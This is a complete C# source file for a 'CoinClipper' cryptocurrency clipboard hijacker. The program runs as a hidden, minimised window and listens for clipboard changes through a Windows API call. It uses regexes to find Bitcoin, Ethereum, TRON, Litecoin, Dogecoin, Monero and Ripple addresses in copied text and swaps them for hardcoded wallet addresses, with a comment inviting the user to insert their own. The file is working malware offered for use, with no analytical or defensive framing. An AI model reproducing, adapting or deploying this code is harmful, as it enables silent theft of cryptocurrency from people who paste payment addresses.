using System;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using Clipboard = System.Windows.Forms.Clipboard;
using Application = System.Windows.Forms.Application;

namespace CoinClipper
{
    public static class Clip
    {
        public static readonly Regex BTCRegex = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b", RegexOptions.Compiled);
        // Ethereum addresses: "0x" followed by exactly 40 hexadecimal characters.
        public static readonly Regex ETHRegex = new Regex(@"\b0x[a-fA-F0-9]{40}\b", RegexOptions.Compiled);
        public static readonly Regex TRCRegex = new Regex(@"T[A-Za-z1-9]{33}", RegexOptions.Compiled);
        // Litecoin addresses: Start with L or M and are typically 26 to 33 characters long.
        public static readonly Regex LTCRegex = new Regex(@"\b(L|M)[a-km-zA-HJ-NP-Z1-9]{26,33}\b", RegexOptions.Compiled);
        // Dogecoin addresses: Start with D and are typically 34 characters long.
        public static readonly Regex DOGERegex = new Regex(@"\bD[a-km-zA-HJ-NP-Z1-9]{33}\b", RegexOptions.Compiled);
        // Monero addresses: Standard addresses are 95 characters long and start with 4.
        public static readonly Regex XMRRegex = new Regex(@"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b", RegexOptions.Compiled);
        // Ripple addresses: Start with r and are usually between 25 and 35 characters long.
        public static readonly Regex XRPRegex = new Regex(@"\br[1-9A-HJ-NP-Za-km-z]{24,34}\b", RegexOptions.Compiled);

        public static string ReplaceCryptoAddresses(string input,
            string btcReplacement, string ethReplacement, string trcReplacement,
            string ltcReplacement, string dogeReplacement, string xmrReplacement, string xrpReplacement)
        {
            string output = BTCRegex.Replace(input, btcReplacement);
            output = ETHRegex.Replace(output, ethReplacement);
            output = TRCRegex.Replace(output, trcReplacement);
            output = LTCRegex.Replace(output, ltcReplacement);
            output = DOGERegex.Replace(output, dogeReplacement);
            output = XMRRegex.Replace(output, xmrReplacement);
            output = XRPRegex.Replace(output, xrpReplacement);
            return output;
        }

        public static void Run()
        {
            // Replace with your addresses..
            string btcReplacement = "bc1qu2cz83zjfnnzm5m06vf78ka2mcy5dxy3c2rrjk";
            string ethReplacement = "0x17049D73D7C2D167F474742702c022dab8AA276a";
            string trcReplacement = "TYa6hbouPRdMG7GyHBng6tgPFwTgiiokiV";
            string ltcReplacement = "LhVW9ehS1r5c5X7H3SSNq2qKNAqAdXZeT8"; 
            string dogeReplacement = "DPaVBdUVbyvPaY6pfvGcEenfcqfiaEYWb2"; 
            string xmrReplacement = "47G48PYCUhxWi3yKqVqdRkPYhJwYvUpuKanY29KU6JwLDiEMWLAayWoP2JCJNnh9Ce9E8TcbnhopRDwr9HkAv9u16yM4Aud"; 
            string xrpReplacement = "r4A8u5nBED6sf4N44Tz9RvzoAm9h2KeqCh"; 

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new ClipboardMonitorForm(
                btcReplacement, ethReplacement, trcReplacement,
                ltcReplacement, dogeReplacement, xmrReplacement, xrpReplacement));
        }
    }

    public static class ClipboardFunc
    {
        public static string GetText()
        {
            string text = string.Empty;
            try
            {
                text = Clipboard.GetText();
            }
            catch { }
            return text;
        }

        public static void SetText(string txt)
        {
            try
            {
                Clipboard.SetText(txt);
            }
            catch { }
        }
    }

    public class ClipboardMonitorForm : Form
    {
        private const int WM_CLIPBOARDUPDATE = 0x031D;
        private bool isUpdating = false;
        private readonly string btcReplacement;
        private readonly string ethReplacement;
        private readonly string trcReplacement;
        private readonly string ltcReplacement;
        private readonly string dogeReplacement;
        private readonly string xmrReplacement;
        private readonly string xrpReplacement;

        public ClipboardMonitorForm(string btcReplacement, string ethReplacement, string trcReplacement,
            string ltcReplacement, string dogeReplacement, string xmrReplacement, string xrpReplacement)
        {
            this.btcReplacement = btcReplacement;
            this.ethReplacement = ethReplacement;
            this.trcReplacement = trcReplacement;
            this.ltcReplacement = ltcReplacement;
            this.dogeReplacement = dogeReplacement;
            this.xmrReplacement = xmrReplacement;
            this.xrpReplacement = xrpReplacement;

           
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            bool success = AddClipboardFormatListener(this.Handle);
            if (!success)
            {
              
            }
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
             
                if (!isUpdating)
                {
                    string currentText = ClipboardFunc.GetText();
                    if (!string.IsNullOrEmpty(currentText))
                    {
                        string newText = Clip.ReplaceCryptoAddresses(
                            currentText,
                            btcReplacement, ethReplacement, trcReplacement,
                            ltcReplacement, dogeReplacement, xmrReplacement, xrpReplacement);
                        if (!newText.Equals(currentText))
                        {
                            isUpdating = true;
                            ClipboardFunc.SetText(newText);
                        }
                    }
                }
                else
                {
                    isUpdating = false;
                }
            }
            base.WndProc(ref m);
        }
    }
}
